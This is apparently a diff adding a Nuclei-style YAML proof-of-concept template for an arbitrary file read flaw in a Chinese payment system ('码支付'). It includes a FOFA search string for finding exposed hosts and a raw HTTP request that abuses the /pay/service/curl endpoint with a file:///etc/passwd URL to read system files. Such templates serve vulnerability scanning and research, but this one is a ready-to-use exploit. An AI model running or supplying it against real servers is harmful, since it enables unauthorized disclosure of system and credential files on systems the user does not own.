@@ -1,0 +1,43 @@
+id: poc-duyg48a3y03fl386
+info:
+  name: 码⽀付存在前台Service任意⽂件读取漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/duyg48a3y03fl386'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: duyg48a3y03fl386
+    fofa: '"/epaydoc/epaydoc.php"'
+http:
+- raw:
+  - 'GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
+
+    KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
+
+    mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: su_webp=1; wp-settings-1=libraryContent%3Dbrowse; wp-settings-time
+
+    -1=1734956910; PHPSESSID=svast3da23vf6s8brt44ddbni9
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
